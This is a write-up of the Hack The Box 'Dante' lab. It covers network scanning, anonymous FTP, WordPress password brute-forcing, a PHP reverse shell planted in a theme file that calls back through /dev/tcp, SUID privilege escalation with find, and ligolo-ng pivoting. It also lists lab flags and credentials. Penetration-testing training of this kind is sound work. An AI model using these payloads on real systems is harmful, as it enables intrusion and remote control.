# Dante

Before anything, just wanted to give myself a reminder that after uploading `ligolo-ng` agent on target, as `root` run these commands on the target to make sure other users cannot modify / delete the agent but can execute it. I store my agents in `/opt` after gaining foothold.

```
chown root:root agent
chmod 755 agent
chattr +i agent
```

Then to set up the TUN interface of `ligolo-ng` run these commands:

```
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up
```

After identifying internal host IP on target machine, add it to `ip route`:

```
sudo ip route add XXX.XXX.XXX.0/24 dev ligolo
```

If TUN interface is being used, run these commands and then start `ligolo-ng`

```
[Agent : user@machine] » autoroute
[Agent : user@machine] » Use existing interface
[Agent : user@machine] » ligolo
[Agent : user@machine] » start
```

## <mark style="color:red;">I'm nuts and bolts about you</mark>

### 10.10.110.100 (DANTE-WEB-NIX01)

Entry point is: `10.10.110.0/24`

Started with RustScan to find available subnets and open ports

```
rustscan -a 10.10.110.0/24
```

<figure><img src="../../../.gitbook/assets/image (688).png" alt=""><figcaption></figcaption></figure>

FTP and SSH ports are open in `10.10.110.100`, let's get more details with a Service Version scan

```
nmap -sV -sC -Pn 10.10.110.100
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 11:58 +08
Nmap scan report for 10.10.110.100
Host is up (0.31s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.71 seconds
```

Now, we can see there is also an additional HTTP server running at port `65000`. The first flag is also visible at `/wordpress`

1st flag: `DANTE{Y0u_Cant_G3t_at_m3_br0!}`

***

## <mark style="color:red;">It's easier this way</mark>

Let's do this one at a time starting with FTP. The FTP port allows anonymous logins.

```
ftp 10.10.110.100
```

<figure><img src="../../../.gitbook/assets/image (689).png" alt=""><figcaption></figcaption></figure>

Disable passive mode and list items

```
ftp> passive
ftp> ls
```

<figure><img src="../../../.gitbook/assets/image (690).png" alt=""><figcaption></figcaption></figure>

Looking around there is a file names `todo.txt`. Download it

```
ftp> get todo.txt
```

<figure><img src="../../../.gitbook/assets/image (691).png" alt=""><figcaption></figcaption></figure>

The file reveals a few stuff that we may be able to use later on

<figure><img src="../../../.gitbook/assets/image (692).png" alt=""><figcaption></figcaption></figure>

Now, we check out the HTTP port. Apart from the default Apache page, the `robot.txt` directory reveals the website has a Wordpress CMS hosted

```
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

<figure><img src="../../../.gitbook/assets/image (694).png" alt=""><figcaption></figcaption></figure>

Checking out the website looks fine nothing unusual. Using Wappalyzer, we now knoq the Wordpress version is 5.4.1, we start by looking for some POCs

<figure><img src="../../../.gitbook/assets/image (695).png" alt=""><figcaption></figcaption></figure>

I tried focusing on the high CVSS but none of them has any exploit to directly gain access. Then I noticed an interesting tool

<figure><img src="../../../.gitbook/assets/image (696).png" alt=""><figcaption></figcaption></figure>

This is my first time doing Wordpress xD. Now, we use `wpscan` to enumerate stuff. Looking at the available options. We can use `-e u` to enumerate for users

```
wpscan --url http://10.10.110.100:65000/wordpress/ -e u
```

<figure><img src="../../../.gitbook/assets/image (697).png" alt=""><figcaption></figcaption></figure>

We have 2 users that are available. remembering the `todo.txt` file hinted `james` maybe has a weak password. We can try to Brute Force passwords with `-P` to specify wordlist

```
wpscan --url http://10.10.110.100:65000/wordpress/ -e u -P /usr/share/wordlists/rockyou.txt
```

Unfortunately, after exhausing almost 10 minutes using `rockyou.txt` wordlist, I looked for an alternative and then I found `cewl`, which is a tool that generates possible passwords from the given URL.

This command outputs into the txt file specified

```
cewl http://10.10.110.100:65000/wordpress/ -w passwords.txt
```

Run the `wpscan` brute force again and we get a hit on `james`!

```
wpscan --url http://10.10.110.100:65000/wordpress/ -e u -P passwords.txt
```

<figure><img src="../../../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>

`james:Toyota`

I tried to SSH with the credentials but that didn't work. So I tried logging into Wordpress but we needed to find the login page. So I fuzzed for it using `feroxbuster`

```
feroxbuster -u http://10.10.110.100:65000/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
```

<figure><img src="../../../.gitbook/assets/image (699).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (700).png" alt=""><figcaption></figcaption></figure>

And there it is, now we login as `james`

Looking around, we can see the 2 users' email here. Also `james` has an Administrator role lol.&#x20;

<figure><img src="../../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>

Because of this, we can mess around with the website. An idea would be to edit the Themes configuration.&#x20;

<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption><p>Hacktricks on Wordpress</p></figcaption></figure>

As an Administrator, we can customize the themes however we want such as a one-liner rev shell :).

<figure><img src="../../../.gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>

I didn't want to break the website so I chose the least used page which is `/404.php`  in the twenty seventeen page to put our reverse shell.

Got my oneliner over here:

<figure><img src="../../../.gitbook/assets/image (708).png" alt=""><figcaption></figcaption></figure>

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.4/1234 0>&1'");
?>
```

<figure><img src="../../../.gitbook/assets/image (709).png" alt=""><figcaption></figcaption></figure>

Update the file and start a listener.

```
rlwrap nc -lvnp 1234
```

Now, navigate to the path of the file. Base on Hacktricks's Wordpress guide, the path will be:

`/wordpress/wp-content/themes/twentyseventeen/404.php`

<figure><img src="../../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>

And we received a callback as `www-data`. Since we only have a semi-shell, let's try to upgrade our shell into an interactive one using `python3`&#x20;

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<figure><img src="../../../.gitbook/assets/image (712).png" alt=""><figcaption></figcaption></figure>

Going down the home path we can see two users available, `james` and `balthazar`

<figure><img src="../../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

I tried to check some stuff out in `james` directory but didn't have permission. So I tried logging in with his password from Wordpress and see if it worked and it did&#x20;

<figure><img src="../../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

Get the second flag in `james`' home directory

2nd flag: `DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}`

***

## <mark style="color:red;">Show me the way</mark>

Next, I downloaded linpeas on the target and ran it

<figure><img src="../../../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>

Looking at the output, we notice the `find` binary has the SUID bit set by being highlighted as a PE vector

<figure><img src="../../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

We can exploit this using this one liner to escalate privileges:

```
find / -exec /bin/bash -p \; -quit
```

<figure><img src="../../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>

Now that we have root, get the flag in the root directory

3rd flag: `DANTE{Too_much_Pr1v!!!!}`

***

## <mark style="color:red;">An open goal</mark>

Looking through the linpeas output, we see some SQL credentials here for `balthazar`

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Because Prolabs has a lot of machines, I deduced there will be a lot of network pivoting and that is why I decided to used `ligolo-ng` to ease my life

On my machine I started `ligolo-ng` `proxy` with a connection to port `8888`

```
./linux-proxy -selfcert -laddr 0.0.0.0:8888
```

<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

And I uploaded the `agent` binary on the target machine using a Python web server.

Execute the `agent` with the same port on the `proxy`

```
./linux-agent -connect 10.10.14.4:8888 -ignore-cert
```

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

Connection established! Now we enter the session and run `ifconfig` to check out available networks

<figure><img src="../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

We have an internal address. Let's add that to our Ligolo routes in the attacker machine.

```
sudo ip route add 172.16.1.0/24 dev ligolo
```

Start the tunneling on Ligolo's proxy

<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

In another tab, I scanned the whole subnet and we get a lot of results

```
rustscan -a 172.16.1.0/24
```

<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

Since we now know the host is up, I wanted to check the details of every subnet with an `nmap` scan

```
nmap -sV -sC 172.16.1.0/24
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 12:26 +08
Nmap scan report for 172.16.1.1
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://172.16.1.1/
443/tcp open  ssl/http nginx
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=pfSense-5efcc658e3fe9/organizationName=pfSense webConfigurator Self-Signed Certificate
| Subject Alternative Name: DNS:pfSense-5efcc658e3fe9
| Not valid before: 2020-07-01T17:22:33
|_Not valid after:  2025-12-22T17:22:33
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1

Nmap scan report for 172.16.1.5
Host is up (0.29s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp?
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp             44 Jan 08  2021 flag.txt
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     220 Dante Staff Drop Box
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|   DNSVersionBindReqTCP: 
|     220 Dante Staff Drop Box
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|   GenericLines, NULL: 
|     220 Dante Staff Drop Box
|   GetRequest, HTTPOptions, RTSPRequest: 
|     500 Syntax error, command unrecognized.
|   Help: 
|     214-The following commands are recognized:
|     ABOR ADAT ALLO APPE AUTH CDUP CLNT CWD 
|     DELE EPRT EPSV FEAT HASH HELP LIST MDTM
|     MFMT MKD MLSD MLST MODE NLST NOOP NOP 
|     OPTS PASS PASV PBSZ PORT PROT PWD QUIT
|     REST RETR RMD RNFR RNTO SITE SIZE STOR
|     STRU SYST TYPE USER XCUP XCWD XMKD XPWD
|     XRMD
|     Have a nice day.
|   RPCCheck: 
|     500 Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|_    Syntax error, command unrecognized.
111/tcp  open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-15T03:33:32
|_Not valid after:  2055-03-15T03:33:32
| ms-sql-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| ms-sql-ntlm-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
|_ssl-date: 2025-03-15T04:37:52+00:00; 0s from scanner time.
2049/tcp open  nlockmgr     1-4 (RPC #100021)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=3/15%Time=67D50331%P=x86_64-pc-linux-gnu%r(N
SF:ULL,1A,"220\x20Dante\x20Staff\x20Drop\x20Box\r\n")%r(GenericLines,1A,"2
SF:20\x20Dante\x20Staff\x20Drop\x20Box\r\n")%r(Help,1A7,"214-The\x20follow
SF:ing\x20commands\x20are\x20recognized:\r\n\x20\x20\x20ABOR\x20\x20\x20AD
SF:AT\x20\x20\x20ALLO\x20\x20\x20APPE\x20\x20\x20AUTH\x20\x20\x20CDUP\x20\
SF:x20\x20CLNT\x20\x20\x20CWD\x20\r\n\x20\x20\x20DELE\x20\x20\x20EPRT\x20\
SF:x20\x20EPSV\x20\x20\x20FEAT\x20\x20\x20HASH\x20\x20\x20HELP\x20\x20\x20
SF:LIST\x20\x20\x20MDTM\r\n\x20\x20\x20MFMT\x20\x20\x20MKD\x20\x20\x20\x20
SF:MLSD\x20\x20\x20MLST\x20\x20\x20MODE\x20\x20\x20NLST\x20\x20\x20NOOP\x2
SF:0\x20\x20NOP\x20\r\n\x20\x20\x20OPTS\x20\x20\x20PASS\x20\x20\x20PASV\x2
SF:0\x20\x20PBSZ\x20\x20\x20PORT\x20\x20\x20PROT\x20\x20\x20PWD\x20\x20\x2
SF:0\x20QUIT\r\n\x20\x20\x20REST\x20\x20\x20RETR\x20\x20\x20RMD\x20\x20\x2
SF:0\x20RNFR\x20\x20\x20RNTO\x20\x20\x20SITE\x20\x20\x20SIZE\x20\x20\x20ST
SF:OR\r\n\x20\x20\x20STRU\x20\x20\x20SYST\x20\x20\x20TYPE\x20\x20\x20USER\
SF:x20\x20\x20XCUP\x20\x20\x20XCWD\x20\x20\x20XMKD\x20\x20\x20XPWD\r\n\x20
SF:\x20\x20XRMD\r\n214\x20Have\x20a\x20nice\x20day\.\r\n")%r(GetRequest,29
SF:,"500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n")%r(HTTPOpti
SF:ons,29,"500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n")%r(RT
SF:SPRequest,29,"500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n"
SF:)%r(RPCCheck,CD,"500\x20Syntax\x20error,\x20command\x20unrecognized\.\r
SF:\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax
SF:\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20c
SF:ommand\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\x20unrec
SF:ognized\.\r\n")%r(DNSVersionBindReqTCP,E7,"220\x20Dante\x20Staff\x20Dro
SF:p\x20Box\r\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500
SF:\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20e
SF:rror,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20comman
SF:d\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\x20unrecogniz
SF:ed\.\r\n")%r(DNSStatusRequestTCP,6C,"220\x20Dante\x20Staff\x20Drop\x20B
SF:ox\r\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x20Sy
SF:ntax\x20error,\x20command\x20unrecognized\.\r\n");
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-15T04:37:16
|_  start_date: 2025-03-15T03:33:27
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: DANTE-SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:f1:fa (VMware)

Nmap scan report for 172.16.1.10
Host is up (0.29s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5a:9c:1b:a5:c1:7f:2d:4f:4b:e8:cc:7b:e4:47:bc:a9 (RSA)
|   256 fd:d6:3a:3f:a8:04:56:4c:e2:76:db:85:91:0c:5e:42 (ECDSA)
|_  256 e2:d5:17:7c:58:75:26:5b:e1:1b:98:39:3b:2c:6c:fc (ED25519)
80/tcp    open     http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Dante Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp   open     netbios-ssn Samba smbd 4.6.2
445/tcp   open     netbios-ssn Samba smbd 4.6.2
1169/tcp  filtered tripwire
14441/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-03-15T04:37:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-NIX02, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Nmap scan report for 172.16.1.12
Host is up (0.29s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        ProFTPD
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 22:cc:a3:e8:7d:d5:65:6d:9d:ea:17:d1:d9:1b:32:cb (RSA)
|   256 04:fb:b6:1a:db:95:46:b7:22:13:61:24:76:80:1e:b8 (ECDSA)
|_  256 ae:c4:55:67:6e:be:ba:65:54:a3:c3:fc:08:29:24:0e (ED25519)
80/tcp   open  http       Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.12/dashboard/
443/tcp  open  ssl/http   Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.12/dashboard/
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
3306/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.1.13
Host is up (0.29s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.13/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
443/tcp open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.13/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp open  microsoft-ds?

Host script results:
| smb2-time: 
|   date: 2025-03-15T04:37:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-WS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:fd:ba (VMware)

Nmap scan report for 172.16.1.17
Host is up (0.29s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
80/tcp    open     http        Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 37M   2020-06-25 13:00  webmin-1.900.zip
| -     2020-07-13 02:21  webmin/
|_
|_http-title: Index of /
139/tcp   open     netbios-ssn Samba smbd 4.6.2
445/tcp   open     netbios-ssn Samba smbd 4.6.2
5061/tcp  filtered sip-tls
6788/tcp  filtered smc-http
10000/tcp open     http        MiniServ 1.900 (Webmin httpd)
|_http-title: Login to Webmin
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: Host: 127.0.0.1

Host script results:
|_nbstat: NetBIOS name: DANTE-NIX03, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-15T04:37:26
|_  start_date: N/A

Nmap scan report for 172.16.1.19
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
8080/tcp open  http    Jetty 9.4.27.v20200227
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.27.v20200227)
Service Info: Host: 127.0.0.1

Nmap scan report for 172.16.1.20
Host is up (0.29s latency).
Not shown: 978 closed tcp ports (conn-refused)
Bug in http-title: no string output.
Bug in http-title: no string output.
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 15:19:e6:66:c3:4f:f7:80:7e:48:f7:b9:9a:f9:ee:08 (RSA)
|   256 f3:ea:12:b5:fa:b0:0c:14:fb:65:98:0f:09:92:5c:56 (ECDSA)
|_  256 42:ca:16:67:5a:e7:a2:01:b0:63:4b:f7:ed:55:db:90 (ED25519)
53/tcp    open  domain             Simple DNS Plus
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: Microsoft-IIS/8.5
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2025-03-15 04:34:01Z)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http           Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN::S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
|_http-server-header: Microsoft-IIS/8.5
|_ssl-date: 2025-03-15T04:37:50+00:00; -1s from scanner time.
| http-robots.txt: 1 disallowed entry 
|_/ 
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: DANTE)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=DANTE-DC01.DANTE.local
| Not valid before: 2025-03-14T03:31:43
|_Not valid after:  2025-09-13T03:31:43
|_ssl-date: 2025-03-15T04:37:51+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DANTE
|   NetBIOS_Domain_Name: DANTE
|   NetBIOS_Computer_Name: DANTE-DC01
|   DNS_Domain_Name: DANTE.local
|   DNS_Computer_Name: DANTE-DC01.DANTE.local
|   DNS_Tree_Name: DANTE.local
|   Product_Version: 6.3.9600
|_  System_Time: 2025-03-15T04:37:10+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DANTE-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_nbstat: NetBIOS name: DANTE-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:74:5f (VMware)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: DANTE-DC01
|   NetBIOS computer name: DANTE-DC01\x00
|   Domain name: DANTE.local
|   Forest name: DANTE.local
|   FQDN: DANTE-DC01.DANTE.local
|_  System time: 2025-03-15T04:37:18+00:00
|_clock-skew: mean: 5s, deviation: 13s, median: 0s
| smb2-time: 
|   date: 2025-03-15T04:37:19
|_  start_date: 2025-03-15T03:31:12

Nmap scan report for 172.16.1.100
Host is up (0.29s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.1.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
